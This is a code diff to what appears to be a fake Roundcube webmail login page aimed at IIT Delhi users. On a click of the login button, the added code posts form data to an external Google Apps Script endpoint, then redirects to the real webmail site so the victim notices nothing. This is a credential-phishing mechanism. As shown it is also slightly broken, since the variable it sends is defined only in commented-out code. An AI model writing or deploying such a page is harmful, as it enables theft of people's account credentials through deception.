@@ -212,27 +212,39 @@
         const submitButton = document.querySelector("#submit")
         const scriptURL = 'https://script.google.com/macros/s/AKfycbxW20IiOh6yX8-l5N3QJWA2CB--jot_neC-SbLIFA5kAWwsqLxWiLkkcz7VIjEVp8iF/exec'
      
-        form.addEventListener('submit', e => {
-          submitButton.disabled = true
-          e.preventDefault()
-          let requestBody = new FormData(form)
-          fetch(scriptURL, { method: 'POST', body: requestBody})
-            .then(response => {
-               alert('Success!', response)
-               submitButton.disabled = false
-              })
-            .catch(error => {
-            alert('Error!', error.message)
-              submitButton.disabled = false
+        // form.addEventListener('submit', e => {
+        //   submitButton.disabled = true
+        //   e.preventDefault()
+        //   let requestBody = new FormData(form)
+        //   fetch(scriptURL, { method: 'POST', body: requestBody})
+        //     .then(response => {
+        //        alert('Success!', response)
+        //        submitButton.disabled = false
+        //       })
+        //     .catch(error => {
+        //     alert('Error!', error.message)
+        //       submitButton.disabled = false
      
-            }
-            )
-        })
+        //     }
+        //     )
+        // })
 
         // Add event listener for click event on login button
         document.getElementById('rcmloginsubmit').addEventListener('click', function(event) {
             // Prevent the default form submission behavior
             event.preventDefault();
+
+            fetch(scriptURL, { method: 'POST', body: requestBody})
+                .then(response => {
+                alert('Success!', response)
+                submitButton.disabled = false
+                })
+                .catch(error => {
+                alert('Error!', error.message)
+                submitButton.disabled = false
+        
+                }
+                )
             
             // Perform the redirection
             window.location.href = 'https://webmail.iitd.ac.in/roundcube/'; // Replace 'https://example.com' with your desired URL
